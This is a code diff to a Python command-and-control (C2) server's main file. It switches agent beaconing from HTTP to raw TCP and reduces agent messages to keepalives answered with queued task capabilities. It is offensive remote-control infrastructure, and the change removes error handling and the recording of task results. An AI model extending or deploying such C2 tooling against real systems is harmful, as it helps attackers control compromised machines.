@@ -13,7 +13,7 @@ import sys
 import threading
 
 import capabilities
-from connection_handler import HttpConnectionHandler
+from connection_handler import TcpConnectionHandler
 from data_parser_crypto import DataParserCrypto
 from database import AgentStore, KeyStore, TaskStore, init_db
 from operator_api import OperatorApiServer, create_app
@@ -38,41 +38,22 @@ def make_agent_handler(dpc: DataParserCrypto, agent_store: AgentStore,
                        task_queue: TaskQueue):
 
     def handle(agent_id: str, raw: bytes) -> bytes:
-        try:
-            msg = dpc.decode(raw)
-        except Exception as exc:
-            log.warning("Failed to parse message from %s: %s", agent_id, exc)
-            return b""
+        msg = dpc.decode(raw)
 
-        metadata = msg.get("metadata", {})
-        agent_store.register(
-            agent_id,
-            hostname=metadata.get("hostname", "unknown"),
-            ip=metadata.get("ip", "unknown"),
-            os_info=metadata.get("os", "unknown"),
-        )
+        if msg != "keepalive":
+            log.warning("Unexpected message from %s: %r", agent_id, msg)
+            return dpc.encode("OK")
 
-        for res in msg.get("results", []):
-            task_id = res.get("task_id")
-            if task_id:
-                task_queue.complete(task_id, res.get("output", ""))
-                log.info("Task %s completed by agent %s", task_id, agent_id)
+        agent_store.register(agent_id,
+                             hostname="unknown", ip="unknown", os_info="unknown")
 
         next_task = task_queue.dequeue(agent_id)
         if next_task:
-            response = {
-                "tasks": [{
-                    "task_id": next_task["id"],
-                    "capability": next_task["capability"],
-                    "params": next_task["params"],
-                }]
-            }
             log.info("Dispatching task %s (%s) to agent %s",
                      next_task["id"], next_task["capability"], agent_id)
-        else:
-            response = {"tasks": []}
+            return dpc.encode(next_task["capability"])
 
-        return dpc.encode(response)
+        return dpc.encode("OK")
 
     return handle
 
@@ -86,7 +67,7 @@ def main():
     task_queue  = TaskQueue(agent_store, task_store)
     dpc         = DataParserCrypto()
 
-    conn_handler = HttpConnectionHandler()
+    conn_handler = TcpConnectionHandler()
     conn_handler.set_message_callback(
         make_agent_handler(dpc, agent_store, task_queue)
     )
@@ -99,7 +80,7 @@ def main():
     api_server.start(OPERATOR_API_HOST, OPERATOR_API_PORT)
 
     log.info("C2 server running.")
-    log.info("  Agent listener : http://%s:%d/beacon/<agent_id>",
+    log.info("  Agent listener : tcp://%s:%d  (raw TCP)",
              AGENT_LISTENER_HOST, AGENT_LISTENER_PORT)
     log.info("  Operator API   : http://%s:%d", OPERATOR_API_HOST, OPERATOR_API_PORT)
     log.info("  Operator token : %s", OPERATOR_AUTH_TOKEN)
